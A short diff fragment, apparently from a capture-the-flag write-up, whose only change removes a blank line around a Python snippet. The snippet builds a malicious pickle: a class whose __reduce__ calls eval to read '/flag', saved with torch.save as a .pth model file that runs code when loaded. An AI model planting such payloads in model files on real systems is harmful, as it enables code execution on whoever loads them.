@@ -31,7 +31,6 @@ class GetFlag:
     def __reduce__(self):
         return (eval, ('int(open("/flag").read())', ))
 
-
 torch.save(GetFlag(), "get_flag_1.pth")
 ```
 
